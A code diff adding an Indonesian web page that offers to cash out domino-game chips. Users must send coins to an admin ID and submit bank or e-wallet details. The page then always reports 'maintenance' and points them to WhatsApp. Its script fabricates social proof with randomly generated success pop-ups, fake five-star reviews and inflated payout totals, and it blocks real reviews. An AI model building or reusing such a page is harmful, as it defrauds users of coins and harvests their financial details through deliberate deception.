@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bongkar - Boss Domino Resmi</title>
+    
+    <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css">
+    <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-bg: #043e3a;
+            --accent-teal: #0b5250;
+            --gold-gradient: linear-gradient(135deg, #ff9800, #ffcc33);
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --text-light: #23e1fd;
+            --text-dark: #5a3418;
+            --input-bg: #f3d2a2;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        /* TESTIMONI */
+
+.stats-wrapper{
+    display:flex !important;
+    flex-direction:column !important;
+    width:100%;
+}
+
+.stat-card{
+    width:100%;
+    display:block;
+}
+.stats-wrapper{
+    padding:20px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+}
+
+.stat-card{
+    background:rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:18px;
+    padding:16px;
+    text-align:center;
+    backdrop-filter:blur(10px);
+    box-shadow:0 8px 20px rgba(0,0,0,.25);
+}
+
+.stat-icon{
+    width:50px;
+    height:50px;
+    margin:0 auto 10px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:rgba(0,229,244,.12);
+    border:1px solid rgba(0,229,244,.25);
+}
+
+.stat-icon i{
+    color:#00e5f4;
+    font-size:20px;
+}
+
+.stat-icon i{
+    color:#00e5f4 !important;
+    font-size:30px !important;
+}
+
+.stat-value{
+    font-size:1.6rem;
+    font-weight:800;
+    color:#fff;
+    margin-bottom:5px;
+}
+
+.stat-label{
+    font-size:.8rem;
+    color:rgba(255,255,255,.75);
+    font-weight:700;
+}
+
+.stat-card.highlight{
+    border:2px solid #ffcc33;
+    background:rgba(255,204,51,.08);
+}
+
+.stat-card.highlight .stat-icon{
+    background:rgba(255,204,51,.15);
+    border-color:#ffcc33;
+}
+
+.stat-card.highlight .stat-icon i{
+    color:#ffcc33;
+}
+
+.stat-card.highlight .stat-value{
+    color:#ffcc33;
+    font-size:1.3rem;
+}
+        
+.testi-container {
+    background: var(--accent-teal);
+    margin: 15px;
+    padding: 20px;
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.05);
+}
+
+.review-card {
+    background: rgba(255,255,255,0.05);
+    border-radius: 15px;
+    padding: 12px;
+    margin-bottom: 10px;
+}
+
+.player-name {
+    color: #23e1fd;
+    font-weight: bold;
+}
+
+.stars {
+    color: #ffcc33;
+    font-size: 12px;
+}
+
+.review-text {
+    color: rgba(255,255,255,.9);
+    font-style: italic;
+    margin: 5px 0;
+}
+
+.time-info {
+    color: #25D366;
+    font-size: 11px;
+}
+
+.star{
+    font-size:28px;
+    color:#666;
+    cursor:pointer;
+    transition:.2s;
+    margin:0 3px;
+}
+
+.star.active{
+    color:#ffcc33;
+    text-shadow:0 0 8px rgba(255,204,51,.8);
+}
+
+        body {
+            background: var(--primary-bg);
+            color: #fff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--primary-bg);
+            min-height: 100vh;
+            box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            padding-bottom: 40px;
+        }
+
+        /* Header Style */
+        .header-banner {
+            background: linear-gradient(to bottom, rgba(11,82,80,0.8), var(--primary-bg)), url('img/bg_top.jpg');
+            background-size: cover;
+            text-align: center;
+            padding: 20px 10px;
+            border-bottom: 3px solid var(--text-light);
+        }
+
+        .header-banner h1 {
+            color: #FFFF33;
+            font-size: 22px;
+            margin: 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .promo-img {
+            width: 90%;
+            border-radius: 15px;
+            margin: 15px auto;
+            display: block;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.1);
+        }
+
+        .info-price-tag {
+    display: block;
+    padding: 14px;
+    text-align: center;
+    /* Efek Gradasi Metalik */
+    background: linear-gradient(145deg, #2c3e50, #000000);
+    color: #ffcc33; /* Warna emas */
+    font-weight: 800;
+    border-radius: 12px;
+    font-size: 16px;
+    border: 2px solid #ff9800;
+    letter-spacing: 1px;
+    text-shadow: 0 0 8px rgba(255, 204, 51, 0.5);
+    position: relative;
+    overflow: hidden;
+    cursor: default; /* Menunjukkan tidak bisa diklik */
+    user-select: none;
+}
+
+/* Efek Cahaya Mengalir (Shine Effect) */
+.info-price-tag::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -60%;
+    width: 20%;
+    height: 200%;
+    background: rgba(255, 255, 255, 0.2);
+    transform: rotate(30deg);
+    animation: shine 3s infinite;
+}
+
+@keyframes shine {
+    0% { left: -60%; }
+    20% { left: 120%; }
+    100% { left: 120%; }
+}
+
+        /* Action Buttons */
+        .nav-links {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 0 20px;
+            margin-bottom: 25px;
+        }
+
+        .btn-action {
+            display: block;
+            padding: 14px;
+            text-align: center;
+            background: var(--gold-gradient);
+            color: #000;
+            text-decoration: none;
+            font-weight: 800;
+            border-radius: 12px;
+            font-size: 14px;
+            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
+            transition: 0.3s;
+        }
+
+        .btn-action:active { transform: scale(0.97); }
+
+        /* Form Styling */
+        .section-card {
+            background: var(--accent-teal);
+            margin: 15px;
+            padding: 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #FFFF33;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .pretty-input {
+            display: flex;
+            align-items: center;
+            background: var(--input-bg);
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .pretty-input i {
+            color: var(--text-dark);
+            font-size: 18px;
+            margin-right: 12px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .pretty-input input, .pretty-input select {
+            border: none;
+            background: transparent;
+            width: 100%;
+            outline: none;
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 15px;
+        }
+
+        /* ID Display Area */
+        .id-display-box {
+            text-align: center;
+            background: rgba(0,0,0,0.2);
+            padding: 15px;
+            border-radius: 15px;
+            margin-top: 10px;
+        }
+
+        .id-image {
+            width: 140px;
+            height: 140px;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            border: 3px solid #ffcc33;
+        }
+
+        .copy-group {
+            display: flex;
+            background: #f3d2a2;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .copy-group input {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            background: transparent;
+            font-weight: bold;
+            text-align: center;
+            color: #5a3418;
+        }
+
+        .btn-copy {
+            background: var(--gold-gradient);
+            border: none;
+            padding: 0 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Upload Area */
+        .file-input-wrapper {
+            background: rgba(255,255,255,0.05);
+            border: 2px dashed #ffcc33;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: none;
+            background: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
+            color: #1a5806;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 0 #1a5806;
+            margin-top: 10px;
+        }
+
+        .btn-submit:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #1a5806;
+        }
+
+        .btn-whatsapp {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            text-decoration: none;
+            color: #fff;
+            background: #25D366;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: bold;
+        }
+
+        /* Notifications */
+        #notifications-container {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column-reverse;
+    gap: 10px;
+}
+
+.notification {
+    background: rgba(10,15,25,.95);
+    color: white;
+    padding: 12px 18px;
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    min-width: 260px;
+    border: 1px solid rgba(255,255,255,.1);
+    box-shadow: 0 10px 25px rgba(0,0,0,.5);
+
+    transform: translateX(-150%);
+    transition: .5s cubic-bezier(.175,.885,.32,1.275);
+}
+
+.notification.show{
+    transform: translateX(0);
+}
+
+.notif-icon{
+    width:40px;
+    height:40px;
+    flex-shrink:0;
+}
+
+.notif-icon img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    border-radius:8px;
+}
+
+.notif-title{
+    color:#00e5f4;
+    font-size:14px;
+    font-weight:800;
+}
+
+.notif-user{
+    color:#fff;
+    font-size:15px;
+    font-weight:700;
+}
+
+.notif-desc{
+    color:#fff;
+    font-size:13px;
+}
+
+.pilihan-bongkar{
+    display:flex;
+    gap:12px;
+    margin-bottom:15px;
+}
+
+.bongkar-card{
+    flex:1;
+    background:rgba(255,255,255,.05);
+    border:2px solid rgba(255,255,255,.15);
+    border-radius:15px;
+    padding:10px;
+    cursor:pointer;
+    text-align:center;
+    transition:.25s;
+}
+
+.bongkar-card img{
+    width:100%;
+    border-radius:10px;
+    display:block;
+}
+
+.bongkar-card span{
+    display:block;
+    margin-top:8px;
+    color:#fff;
+    font-weight:700;
+    font-size:13px;
+}
+
+.bongkar-card.active{
+    border-color:#ffcc33;
+    box-shadow:0 0 15px rgba(255,204,51,.45);
+    transform:scale(1.03);
+}
+    </style>
+</head>
+<body>
+
+    <div id="notifications-container"></div>
+
+    <div class="main-container">
+        <div class="header-banner">
+            <h1>ADMIN RESMI BONGKAR</h1>
+        </div>
+
+        <img src="bgbos1.png" alt="Promo" class="promo-img">
+
+        <div class="nav-links">
+            <a href="https://youtu.be/rxUHXhwJzXc?si=2D8G3RkyEFypnwqF" target="_blank" class="btn-action">
+                <i class="fab fa-youtube"></i> TUTORIAL & TESTIMONI CEK DISINI
+            </a>
+            <div class="info-price-tag">
+        <i class="fas fa-tags"></i> ❗️BONGKAR PER B 55K❗️
+    </div>
+</div>
+        <form id="bongkarForm">
+            <div class="section-card">
+                <span class="section-title">INFO PENGIRIM</span>
+                
+                <div class="pretty-input">
+                    <i class="bx bx-id-card"></i>
+                    <input type="number" name="id_pengirim" placeholder="Masukkan ID Game Anda" required>
+                </div>
+
+                <div class="pretty-input">
+                    <i class="bx bx-user"></i>
+                    <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
+                </div>
+
+                <span class="section-title">PILIH JENIS BONGKAR</span>
+
+<div class="pilihan-bongkar">
+    <div class="bongkar-card active" data-value="bos">
+        <img src="img/bos1.png" alt="">
+        <span> </span>
+    </div>
+
+    <div class="bongkar-card" data-value="premium">
+        <img src="img/bos3.png" alt="">
+        <span> </span>
+    </div>
+</div>
+
+<input type="hidden" name="jenis_bongkar" id="jenisBongkar" value="bos">
+
+                <div class="pretty-input">
+                    <i class="bx bx-coin-stack"></i>
+                    <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 10B)" required>
+                </div>
+            </div>
+
+            <div class="section-card">
+                <span class="section-title">ID TUJUAN PENGIRIMAN</span>
+                <div class="id-display-box">
+                    <img src="img/bgidbos.png" alt="ID Admin" class="id-image">
+                    <div class="copy-group">
+                        <input type="text" id="idPenerima" value="153068307" readonly>
+                        <button type="button" class="btn-copy" onclick="copyID()">SALIN</button>
+                    </div>
+                    <p style="font-size: 11px; margin-top: 10px; color: #ffcc33;">
+                        *Kirim koin ke ID di atas sebelum mengisi form
+                    </p>
+                </div>
+            </div>
+
+            <div class="section-card">
+                <span class="section-title">BUKTI & PENCAIRAN</span>
+                
+                <div class="file-input-wrapper">
+                    <label style="font-size: 13px; margin-bottom: 8px; display: block;">Upload Screenshot History</label>
+                    <input type="file" name="bukti_transfer" accept="image/*" required>
+                </div>
+
+                <div class="pretty-input">
+                    <i class="bx bx-landmark"></i>
+                    <select name="bank_pencairan" required>
+                        <option value="" disabled selected>Pilih Bank / E-Wallet</option>
+                        <option>DANA</option>
+                        <option>OVO</option>
+                        <option>GOPAY</option>
+                        <option>BCA</option>
+                        <option>BRI</option>
+                        <option>BNI</option>
+                        <option>MANDIRI</option>
+                    </select>
+                </div>
+
+                <div class="pretty-input">
+                    <i class="bx bx-credit-card"></i>
+                    <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
+                </div>
+
+                <div class="pretty-input">
+                    <i class="bx bx-user-circle"></i>
+                    <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">KIRIM FORMULIR</button>
+                
+                <a href="https://wa.me/6285828331675" class="btn-whatsapp" target="_blank">
+                    <i class="fab fa-whatsapp" style="font-size: 24px;"></i>
+                    CHAT ADMIN (PROSES CEPAT)
+                </a>
+                </div>
+<div class="stats-wrapper">
+
+    <div class="stat-card">
+        <div class="stat-icon">
+            <i class="fas fa-chart-line"></i>
+        </div>
+        <div class="stat-value">103,725+</div>
+        <div class="stat-label">TOTAL TRANSAKSI BONGKAR</div>
+    </div>
+
+    <div class="stat-card">
+        <div class="stat-icon">
+            <i class="fas fa-circle-check"></i>
+        </div>
+        <div class="stat-value">103,725+</div>
+        <div class="stat-label">BONGKAR SUKSES</div>
+    </div>
+
+    <div class="stat-card highlight">
+        <div class="stat-icon">
+            <i class="fas fa-wallet"></i>
+        </div>
+        <div class="stat-value">Rp 269.562.252.500</div>
+        <div class="stat-label">DANA YANG DICAIRKAN</div>
+    </div>
+            </div>
+            <div class="testi-container">
+    <span class="section-title">ULASAN PEMBELI</span>
+
+    <div style="background:rgba(255,255,255,.05);padding:15px;border-radius:15px;margin-bottom:20px;">
+        <input type="text" id="rev-name" placeholder="Nama..."
+        style="width:100%;background:rgba(0,0,0,.3);border:1px solid #444;color:#fff;padding:10px;border-radius:8px;margin-bottom:10px;outline:none;">
+
+        <textarea id="rev-text" placeholder="Ulasan..."
+        rows="2"
+        style="width:100%;background:rgba(0,0,0,.3);border:1px solid #444;color:#fff;padding:10px;border-radius:8px;outline:none;"></textarea>
+
+        <div id="star-rating" style="margin-top:10px;text-align:center;">
+            <i class="fas fa-star star" data-rate="1"></i>
+            <i class="fas fa-star star" data-rate="2"></i>
+            <i class="fas fa-star star" data-rate="3"></i>
+            <i class="fas fa-star star" data-rate="4"></i>
+            <i class="fas fa-star star" data-rate="5"></i>
+        </div>
+
+        <div id="rating-text"
+        style="text-align:center;color:#ffcc33;font-weight:700;margin-top:5px;">
+            Sangat Puas ⭐⭐⭐⭐⭐
+        </div>
+
+        <input type="hidden" id="selected-rating" value="5">
+
+        <button onclick="showNotice()"
+        style="width:100%;margin-top:10px;background:#23e1fd;border:none;padding:10px;border-radius:8px;font-weight:800;cursor:pointer;">
+            KIRIM ULASAN
+        </button>
+    </div>
+
+    <div id="review-list"></div>
+</div>
+
+<div id="modalNotice" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.85);
+justify-content:center;
+align-items:center;
+z-index:99999;">
+    <div style="
+    background:#0b5250;
+    padding:25px;
+    border-radius:20px;
+    max-width:300px;
+    text-align:center;">
+        <i class="fas fa-exclamation-circle"
+        style="font-size:50px;color:#ffcc33;"></i>
+
+        <p>Anda hanya bisa berkomentar jika sudah melakukan withdraw koin.</p>
+
+        <button onclick="closeNotice()"
+        style="padding:10px 20px;border:none;border-radius:10px;font-weight:bold;">
+            SAYA MENGERTI
+        </button>
+    </div>
+</div>
+        </form>
+    </div>
+
+    <script>
+        // Copy Function
+        function copyID() {
+            const copyText = document.getElementById("idPenerima");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            alert("ID Berhasil disalin: " + copyText.value);
+        }
+
+        // Form Logic
+        document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById("submitBtn");
+            btn.innerText = "PROSES...";
+            btn.disabled = true;
+
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+
+            try {
+                const res = await fetch("/api/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await res.json();
+                if (result.status === "success") {
+                    alert("Pencairan Dibawah 35B Saat ini Sedang Maintenance❗️Silahkan Chat Admin Untuk Konfirmasi");
+                    this.reset();
+                } else {
+                    alert("Gagal mengirim data. Silahkan coba lagi.");
+                }
+            } catch (err) {
+                // Simulasi jika API belum ready
+                alert("Pencairan Maintenance ❗️\nSilahkan kirim bukti ke WhatsApp Admin agar segera diproses.");
+            } finally {
+                btn.innerText = "KIRIM FORMULIR";
+                btn.disabled = false;
+            }
+        });
+
+        // Notifications System (HD)
+        const names = ['Poco X3 Pro', 'Siti Aisyah', 'Agus Rahman', 'RMX 7090', 'User_99', 'Infinix User'];
+        const amounts = ['100B | Rp. 600.000', '50B | Rp. 300.000', '35B | Rp. 210.000', '500B | Rp. 3.000.000'];
+
+const transaksi = [
+    { nominal: "550.000", chip: "10B" },
+    { nominal: "825.000", chip: "15B" },
+    { nominal: "1.100.000", chip: "20B" },
+    { nominal: "275.000", chip: "5B" },
+    { nominal: "5.500.000", chip: "100B" },
+    { nominal: "11.000.000", chip: "200B" },
+    { nominal: "16.500.000", chip: "300B" },
+    { nominal: "2.750.000", chip: "50B" },
+    { nominal: "495.000", chip: "9B" },
+    { nominal: "2.200.000", chip: "40B" },
+    { nominal: "165.000", chip: "3B" }
+];
+
+const banks = ["Dana","OVO","GoPay","BCA","BRI","BNI","Mandiri"];
+
+function showNotif() {
+
+    const trx = transaksi[Math.floor(Math.random() * transaksi.length)];
+    const name = names[Math.floor(Math.random() * names.length)];
+
+    const div = document.createElement("div");
+    div.className = "notification";
+
+    div.innerHTML = `
+        <div class="notif-icon">
+            <img src="img/live.jpg">
+        </div>
+
+        <div>
+            <div class="notif-title">
+                BONGKAR SUKSES
+            </div>
+
+            <div class="notif-user">
+                ${name}
+            </div>
+
+            <div class="notif-desc">
+                ${banks[Math.floor(Math.random()*banks.length)]}
+                - Rp ${trx.nominal}
+                - ${trx.chip}
+            </div>
+        </div>
+    `;
+
+    document.getElementById("notifications-container").appendChild(div);
+
+    setTimeout(()=>{
+        div.classList.add("show");
+    },100);
+
+    setTimeout(()=>{
+        div.classList.remove("show");
+
+        setTimeout(()=>{
+            div.remove();
+        },600);
+    },4000);
+}
+        showNotif();
+setInterval(showNotif, 5000);
+        // ===== ULASAN =====
+const stars = document.querySelectorAll('.star');
+const ratingInput = document.getElementById('selected-rating');
+const ratingText = document.getElementById('rating-text');
+
+const labels = {
+    1:"Sangat Buruk",
+    2:"Kurang Puas",
+    3:"Lumayan",
+    4:"Puas",
+    5:"Sangat Puas"
+};
+
+stars.forEach(star=>{
+    star.addEventListener('click',()=>{
+        const rating = parseInt(star.dataset.rate);
+
+        ratingInput.value = rating;
+
+        stars.forEach(s=>{
+            if(parseInt(s.dataset.rate)<=rating){
+                s.classList.add('active');
+            }else{
+                s.classList.remove('active');
+            }
+        });
+
+        ratingText.innerHTML =
+            labels[rating] + " " + "⭐".repeat(rating);
+    });
+});
+
+stars.forEach(s=>s.classList.add('active'));
+
+const players = [
+"ahmad","player_2448011","player_1140854",
+"kings","RizkyGamer","shadowX","indra_777",
+"sultanboss","dimas","luffy","agam"
+];
+
+const texts = [
+"Adminnya ramah banget!",
+"Selalu amanah bosku.",
+"Gak pake lama langsung cair.",
+"Trusted banget pokoknya.",
+"Baru pertama coba langsung gacor cairnya.",
+"bongkar 100b aman bosku",
+"makasih kak done bongkar 20b",
+"Amanah bongkar 5b gasampe 1 menit cair",
+"done bang bongkar 10b dana lansung cair",
+"Makasih admin amanah dana sudah cair bos",
+"Bongkar 200b aman cair gasampe 2 menit",
+"Bongkar 15b aman bang thanks ya"
+];
+
+function getRandom(arr){
+    return arr[Math.floor(Math.random()*arr.length)];
+}
+
+const reviewList = document.getElementById('review-list');
+
+for(let i=0;i<5;i++){
+    const div = document.createElement('div');
+    div.className = 'review-card';
+
+    div.innerHTML = `
+    <div style="display:flex;justify-content:space-between;">
+        <span class="player-name">${getRandom(players)}</span>
+        <span class="stars">★★★★★</span>
+    </div>
+    <p class="review-text">"${getRandom(texts)}"</p>
+    <div class="time-info">${Math.floor(Math.random()*50)+1} Menit lalu</div>
+    `;
+
+    reviewList.appendChild(div);
+}
+
+function showNotice(){
+    const n = document.getElementById('rev-name').value;
+    const t = document.getElementById('rev-text').value;
+
+    if(!n || !t){
+        alert("Isi nama dan ulasan!");
+        return;
+    }
+
+    document.getElementById('modalNotice').style.display='flex';
+}
+
+function closeNotice(){
+    document.getElementById('modalNotice').style.display='none';
+}
+
+const cards = document.querySelectorAll(".bongkar-card");
+const jenisInput = document.getElementById("jenisBongkar");
+
+cards.forEach(card=>{
+    card.addEventListener("click",()=>{
+
+        cards.forEach(c=>c.classList.remove("active"));
+
+        card.classList.add("active");
+
+        jenisInput.value = card.dataset.value;
+    });
+});
+    </script>
+</body>
+</html>
